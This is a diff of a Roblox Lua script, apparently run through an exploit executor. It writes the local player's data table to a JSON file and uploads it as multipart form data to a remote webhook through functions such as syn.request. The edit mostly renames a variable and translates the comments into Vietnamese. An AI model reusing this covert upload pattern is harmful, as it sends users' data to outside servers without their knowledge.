@@ -288,8 +288,8 @@ function sendwebhook2(msg)
         end
     end
     end
-    Name = game.Players.LocalPlayer.Name.."_Data" .. ".json"
-    writefile(Name, game:service'HttpService':JSONEncode(PrintTable))
+    fileName = game.Players.LocalPlayer.Name.."_Data" .. ".json"
+    writefile(fileName, game:service'HttpService':JSONEncode(PrintTable))
     [[
     local set
     if not pcall(function() readfile(Name) end) then 
@@ -299,24 +299,24 @@ function sendwebhook2(msg)
     set = game:service'HttpService':JSONDecode(readfile(Name))
     ]]
     ---
-    function sendfile()
--- Read the file content
-local fileData = readfile(Name)
 
--- Create the multipart/form-data body
+-- Đọc nội dung tệp JSON
+local fileData = readfile(fileName)
+
+-- Tạo nội dung body của yêu cầu với multipart/form-data
 local boundary = "------------------------" .. game:GetService("HttpService"):GenerateGUID(false)
 local body = "--" .. boundary .. "\r\n"
-    .. "Content-Disposition: form-data; name=\"file\"; filename=\"" .. Name .. "\"\r\n"
-    .. "Content-Type: text/plain\r\n\r\n"
+    .. "Content-Disposition: form-data; name=\"file\"; filename=\"" .. fileName .. "\"\r\n"
+    .. "Content-Type: application/json\r\n\r\n"
     .. fileData .. "\r\n--" .. boundary .. "--"
 
--- Define headers
+-- Định nghĩa headers
 local headers = {
     ["Content-Type"] = "multipart/form-data; boundary=" .. boundary,
     ["Content-Length"] = tostring(#body),
 }
 
--- Make the HTTP request
+-- Gửi yêu cầu HTTP
 local requestFunction = http_request or request or HttpPost or syn.request
 if requestFunction then
     local response = requestFunction({
@@ -326,10 +326,15 @@ if requestFunction then
         Body = body,
     })
 
-    -- Print the response for debugging purposes
-    print(response and response.StatusCode or "No response")
-else
-    print("HTTP request function not found!")
-end
+    -- Hiển thị phản hồi để kiểm tra lỗi hoặc thành công
+    if response then
+        print("Trạng thái: " .. response.StatusCode)
+        print("Phản hồi: " .. response.Body)
+    else
+        print("Không nhận được phản hồi từ máy chủ.")
     end
-    sendfile()
+else
+    print("Không tìm thấy hàm gửi HTTP!")
+end
+
+    ---
